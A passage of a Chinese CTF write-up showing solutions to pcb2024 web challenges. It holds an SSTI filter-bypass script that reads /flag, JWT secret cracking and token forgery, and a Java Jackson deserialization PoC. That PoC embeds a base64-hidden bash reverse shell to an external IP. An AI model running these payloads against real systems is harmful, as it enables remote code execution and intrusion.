                <span class="k">print</span><span class="p">(</span><span class="s2">"你过关！"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s2">"filtered"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'index.html'</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">hint</span><span class="o">=</span><span class="s2">"f4dd790b-bc4e-48de-b717-903d433c597f"</span><span class="p">)</span>
</pre></div>
<p>黑盒ssti绕过写脚本如下,只用绕过空格和关键词那么我们拼接绕过</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.18.28/calc"</span>
<span class="n">seq</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">seq</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="n">ans</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.18.28/"</span>
<span class="n">param</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'answer'</span> <span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">ans</span><span class="p">),</span>
    <span class="s1">'username'</span> <span class="p">:</span> <span class="s1">'''{{config.__init__.__globals__['__builtins__']['ev''al']("__impo"+"rt__('o"+"s').po"+"pen('cat$IFS/flag').read()")}}'''</span>
<span class="p">}</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">seq</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">param</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">param</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</pre></div>
<h2 data-content="1" id="28948621d97785b53e62e22654f621e5">LookUp-pcb2024</h2>
<p>源码如下</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">IndexController</span> <span class="o">{</span>  
    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="o">{</span><span class="s">"/des"</span><span class="o">},</span> <span class="n">method</span> <span class="o">=</span> <span class="o">{</span><span class="n">RequestMethod</span><span class="o">.</span><span class="na">POST</span><span class="o">})</span>  
    <span class="kd">public</span> <span class="n">String</span> <span class="nf">deserialize</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="s">"base64Data"</span><span class="o">)</span> <span class="n">String</span> <span class="n">base64Data</span><span class="o">)</span> <span class="o">{</span>  
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">base64Data</span><span class="o">);</span>  
        <span class="k">return</span> <span class="n">deserializeData</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">getMimeDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">base64Data</span><span class="o">));</span>  
    <span class="o">}</span>  
    <span class="kd">private</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">deserializeData</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">serializedData</span><span class="o">)</span> <span class="o">{</span>  
        <span class="k">try</span> <span class="o">{</span>  
            <span class="n">ByteArrayInputStream</span> <span class="n">bis</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">serializedData</span><span class="o">);</span>  
            <span class="n">MyInputstream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyInputstream</span><span class="o">(</span><span class="n">bis</span><span class="o">);</span>  
            <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>  
            <span class="n">ois</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>  
            <span class="n">bis</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>  
            <span class="k">return</span> <span class="s">"success"</span><span class="o">;</span>  
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InvalidClassException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>  
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>  
            <span class="k">return</span> <span class="s">"hacker"</span><span class="o">;</span>  
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e2</span><span class="o">)</span> <span class="o">{</span>  
            <span class="k">return</span> <span class="s">"error"</span><span class="o">;</span>  
        <span class="o">}</span>    <span class="o">}}</span>
</pre></div>
<p>并实现了Myinputstream的过滤</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyInputstream</span> <span class="kd">extends</span> <span class="n">ObjectInputStream</span> <span class="o">{</span>  
    <span class="kd">private</span> <span class="n">ArrayList</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">();</span>  

    <span class="kd">public</span> <span class="nf">MyInputstream</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">in</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>  
        <span class="kd">super</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>  
    <span class="o">}</span>  
    <span class="nd">@Override</span> <span class="c1">// java.io.ObjectInputStream  </span>
    <span class="kd">protected</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">resolveClass</span><span class="o">(</span><span class="n">ObjectStreamClass</span> <span class="n">desc</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>  
        <span class="k">this</span><span class="o">.</span><span class="na">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>  
        <span class="k">this</span><span class="o">.</span><span class="na">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">hello</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>  
        <span class="k">this</span><span class="o">.</span><span class="na">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">HashMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>  
        <span class="k">this</span><span class="o">.</span><span class="na">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">Hashtable</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>  
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>  
        <span class="k">if</span> <span class="o">(!</span><span class="k">this</span><span class="o">.</span><span class="na">list</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">desc</span><span class="o">.</span><span class="na">getName</span><span class="o">()))</span> <span class="o">{</span>  
            <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">resolveClass</span><span class="o">(</span><span class="n">desc</span><span class="o">);</span>  
        <span class="o">}</span>        <span class="k">throw</span> <span class="k">new</span> <span class="n">InvalidClassException</span><span class="o">(</span><span class="s">"nonono"</span><span class="o">);</span>  
    <span class="o">}}</span>
</pre></div>
<p>pom依赖如下</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;dependencies&gt;</span>

      <span class="c">&lt;!-- Spring Web MVC --&gt;</span>

    <span class="nt">&lt;dependency&gt;</span>

      <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>

      <span class="nt">&lt;artifactId&gt;</span>spring-boot-starter<span class="nt">&lt;/artifactId&gt;</span>

      <span class="nt">&lt;version&gt;</span>2.5.4<span class="nt">&lt;/version&gt;</span> <span class="c">&lt;!-- 替换为你想要使用的 Spring Boot 版本 --&gt;</span>

    <span class="nt">&lt;/dependency&gt;</span>



    <span class="c">&lt;!-- Spring Boot Web 依赖，用于构建 Web 应用程序 --&gt;</span>

    <span class="nt">&lt;dependency&gt;</span>

      <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>

      <span class="nt">&lt;artifactId&gt;</span>spring-boot-starter-web<span class="nt">&lt;/artifactId&gt;</span>

      <span class="nt">&lt;version&gt;</span>2.5.4<span class="nt">&lt;/version&gt;</span> <span class="c">&lt;!-- 替换为你想要使用的 Spring Boot 版本 --&gt;</span>

    <span class="nt">&lt;/dependency&gt;</span>

    <span class="nt">&lt;dependency&gt;</span>

      <span class="nt">&lt;groupId&gt;</span>commons-codec<span class="nt">&lt;/groupId&gt;</span>

      <span class="nt">&lt;artifactId&gt;</span>commons-codec<span class="nt">&lt;/artifactId&gt;</span>

      <span class="nt">&lt;version&gt;</span>1.15<span class="nt">&lt;/version&gt;</span> <span class="c">&lt;!-- 替换为你想要使用的 Apache Commons Codec 版本 --&gt;</span>

    <span class="nt">&lt;/dependency&gt;</span>

  <span class="nt">&lt;dependency&gt;</span>

        <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>

        <span class="nt">&lt;artifactId&gt;</span>spring-webmvc<span class="nt">&lt;/artifactId&gt;</span>

        <span class="nt">&lt;version&gt;</span>5.3.10<span class="nt">&lt;/version&gt;</span>

      <span class="nt">&lt;/dependency&gt;</span>



      <span class="c">&lt;!-- Spring Core --&gt;</span>

      <span class="nt">&lt;dependency&gt;</span>

        <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>

        <span class="nt">&lt;artifactId&gt;</span>spring-core<span class="nt">&lt;/artifactId&gt;</span>

        <span class="nt">&lt;version&gt;</span>5.3.10<span class="nt">&lt;/version&gt;</span>

      <span class="nt">&lt;/dependency&gt;</span>



      <span class="c">&lt;!-- 其他Spring依赖 --&gt;</span>

      <span class="c">&lt;!-- 根据您的具体需求添加其他Spring依赖，如Spring Security、Spring Data等 --&gt;</span>

    <span class="nt">&lt;dependency&gt;</span>

      <span class="nt">&lt;groupId&gt;</span>junit<span class="nt">&lt;/groupId&gt;</span>

      <span class="nt">&lt;artifactId&gt;</span>junit<span class="nt">&lt;/artifactId&gt;</span>

      <span class="nt">&lt;version&gt;</span>4.11<span class="nt">&lt;/version&gt;</span>

      <span class="nt">&lt;scope&gt;</span>test<span class="nt">&lt;/scope&gt;</span>

    <span class="nt">&lt;/dependency&gt;</span>

    <span class="nt">&lt;dependency&gt;</span>

      <span class="nt">&lt;groupId&gt;</span>rome<span class="nt">&lt;/groupId&gt;</span>

      <span class="nt">&lt;artifactId&gt;</span>rome<span class="nt">&lt;/artifactId&gt;</span>

      <span class="nt">&lt;version&gt;</span>1.0<span class="nt">&lt;/version&gt;</span>

    <span class="nt">&lt;/dependency&gt;</span>

  <span class="nt">&lt;/dependencies&gt;</span>
</pre></div>
<p>我们打二次反序列化, 有jackson依赖我们直接打原生的<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241109180720-68272430-9e82-1.png"/><br/>
链子也就是jackson</p>
<div class="highlight"><pre><span></span><span class="n">BadAttributeValueExpException</span><span class="err">#</span><span class="n">readObject</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">ToStringBean</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span> <span class="o">-&gt;</span><span class="n">POJONode</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">SignedObject</span><span class="err">#</span><span class="n">getObject</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">BadAttributeValueExpException</span><span class="err">#</span><span class="n">readObject</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">BaseJsonNode</span><span class="err">#</span><span class="n">toString</span><span class="o">()</span> <span class="o">-&gt;</span> <span class="n">TemplatesImpl</span><span class="err">#</span><span class="n">getOutputProperties</span><span class="o">()</span>
</pre></div>
<p>构造payload如下：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">com.fasterxml.jackson.databind.node.POJONode</span><span class="o">;</span>  

<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.security.*</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>  

<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">javassist.*</span><span class="o">;</span>  

<span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="o">;</span>  

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">SignedObjectBAVEPoC</span>  
<span class="o">{</span>  
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>  
        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>  
        <span class="n">CtClass</span> <span class="n">ctClass0</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="o">);</span>  
        <span class="n">CtMethod</span> <span class="n">writeReplace</span> <span class="o">=</span> <span class="n">ctClass0</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"writeReplace"</span><span class="o">);</span>  
        <span class="n">ctClass0</span><span class="o">.</span><span class="na">removeMethod</span><span class="o">(</span><span class="n">writeReplace</span><span class="o">);</span>  
        <span class="n">ctClass0</span><span class="o">.</span><span class="na">toClass</span><span class="o">();</span>  

        <span class="n">ClassPool</span> <span class="n">pool2</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>  
        <span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">pool2</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">"a"</span><span class="o">);</span>  
        <span class="n">CtClass</span> <span class="n">superClass</span> <span class="o">=</span> <span class="n">pool2</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>  
        <span class="n">ctClass</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">superClass</span><span class="o">);</span>  
        <span class="n">CtConstructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CtConstructor</span><span class="o">(</span><span class="k">new</span> <span class="n">CtClass</span><span class="o">[]{},</span><span class="n">ctClass</span><span class="o">);</span>  
        <span class="n">constructor</span><span class="o">.</span><span class="na">setBody</span><span class="o">(</span><span class="s">"Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAgIC1jICAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjM3LjE3My84OTk5IDA+JjEn}|{base64,-d}|{bash,-i}\");"</span><span class="o">);</span>  
        <span class="n">ctClass</span><span class="o">.</span><span class="na">addConstructor</span><span class="o">(</span><span class="n">constructor</span><span class="o">);</span>  
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>  
        <span class="n">TemplatesImpl</span> <span class="n">templatesImpl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>  
        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">bytes</span><span class="o">});</span>  
        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"bbb"</span><span class="o">);</span>  
        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>  

        <span class="n">POJONode</span> <span class="n">jsonNodes</span> <span class="o">=</span> <span class="k">new</span> <span class="n">POJONode</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">);</span>  
        <span class="n">BadAttributeValueExpException</span> <span class="n">exp</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>  
        <span class="n">Field</span> <span class="n">val</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"javax.management.BadAttributeValueExpException"</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"val"</span><span class="o">);</span>  
        <span class="n">val</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  
        <span class="n">val</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">exp</span><span class="o">,</span><span class="n">jsonNodes</span><span class="o">);</span>  
        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>  
        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">barr</span><span class="o">);</span>  
        <span class="c1">//二次反序列化  </span>
        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">);</span>  
        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>  
        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>  
        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">(</span><span class="n">exp</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">));</span>  



        <span class="n">POJONode</span> <span class="n">node</span> <span class="o">=</span> <span class="k">new</span> <span class="n">POJONode</span><span class="o">(</span><span class="n">signedObject</span><span class="o">);</span>  
        <span class="n">BadAttributeValueExpException</span> <span class="n">val2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>  

        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">val2</span><span class="o">,</span> <span class="s">"val"</span><span class="o">,</span> <span class="n">node</span><span class="o">);</span>  
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">serialize</span><span class="o">(</span><span class="n">val2</span><span class="o">)));</span>  

    <span class="o">}</span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">serialize</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>  
    <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>  
    <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">);</span>  
    <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>  
    <span class="k">return</span> <span class="n">baos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();}</span>  
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">String</span> <span class="n">field</span><span class="o">,</span> <span class="n">Object</span> <span class="n">val</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>  
        <span class="n">Field</span> <span class="n">dField</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">field</span><span class="o">);</span>  
        <span class="n">dField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  
        <span class="n">dField</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">val</span><span class="o">);</span>  
    <span class="o">}</span>  

<span class="o">}</span>
</pre></div>
<h2 data-content="1" id="c67ef49a41b70043c5d29178224269b0">ezpython</h2>
<p>dirsearch扫到一个login入口，试了一下弱口令登进去: test/123456</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241109180420-fd2f7ace-9e81-1.png"/></p>
<p>有一个管理员登录入口</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">loginForm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'loginForm'</span><span class="p">);</span>
        <span class="kr">const</span> <span class="nx">errorMessage</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'errorMessage'</span><span class="p">);</span>

        <span class="nx">loginForm</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">'submit'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">event</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>

            <span class="kr">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'username'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
            <span class="kr">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'password'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>

            <span class="c1">// 发送登录请求</span>
            <span class="nx">fetch</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">,</span> <span class="p">{</span>
                <span class="nx">method</span><span class="o">:</span> <span class="s1">'POST'</span><span class="p">,</span>
                <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
                    <span class="s1">'Content-Type'</span><span class="o">:</span> <span class="s1">'application/json'</span><span class="p">,</span>
                <span class="p">},</span>
                <span class="nx">body</span><span class="o">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="nx">password</span> <span class="p">}),</span>
            <span class="p">})</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="p">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="p">=&gt;</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
                    <span class="c1">// 保存JWT到localStorage</span>
                    <span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">'token'</span><span class="p">,</span> <span class="sb">`</span><span class="si">${</span><span class="nx">data</span><span class="p">.</span><span class="nx">token</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
                    <span class="c1">// 显示成功消息，并启用受保护的请求按钮</span>
                    <span class="nx">alert</span><span class="p">(</span><span class="s2">"Login successful!"</span><span class="p">);</span>
                    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'protectedBtn'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="s1">'block'</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="nx">errorMessage</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">;</span>
                    <span class="nx">errorMessage</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="s1">'block'</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">})</span>
            <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
                <span class="nx">errorMessage</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="s1">'An error occurred. Please try again.'</span><span class="p">;</span>
                <span class="nx">errorMessage</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="s1">'block'</span><span class="p">;</span>
            <span class="p">});</span>
        <span class="p">});</span>

        <span class="c1">// 点击按钮访问受保护的路由时，自动添加 JWT 令牌</span>
        <span class="kd">function</span> <span class="nx">accessProtectedRoute</span><span class="p">()</span> <span class="p">{</span>
            <span class="kr">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">'token'</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// 访问受保护的路由，并将JWT附加到请求头中</span>
                <span class="nx">fetch</span><span class="p">(</span><span class="s1">'/protected'</span><span class="p">,</span> <span class="p">{</span>
                    <span class="nx">method</span><span class="o">:</span> <span class="s1">'GET'</span><span class="p">,</span>
                    <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
                        <span class="s1">'Authorization'</span><span class="o">:</span> <span class="nx">token</span>  <span class="c1">// 添加 JWT 到 Authorization 请求头</span>
                    <span class="p">}</span>
                <span class="p">})</span>
                <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="p">=&gt;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
                <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span> <span class="p">=&gt;</span> <span class="p">{</span>
                    <span class="nx">alert</span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>  <span class="c1">// 显示不同的消息</span>
                <span class="p">})</span>
                <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="p">=&gt;</span> <span class="p">{</span>
                    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">'Error:'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
                <span class="p">});</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">alert</span><span class="p">(</span><span class="s1">'No token found. Please login.'</span><span class="p">);</span>
            <span class="p">}</span>

        <span class="p">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241109180521-21a75174-9e82-1.png"/></p>
<p>拿到token爆破secretkey:a123456<br/>
然后伪造token进去</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241109180533-28913324-9e82-1.png"/></p>
<p>得到路由ser并由部分源码</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="k">def</span> <span class="nf">hhhhackme</span><span class="p">(</span><span class="n">pickled</span><span class="p">):</span>
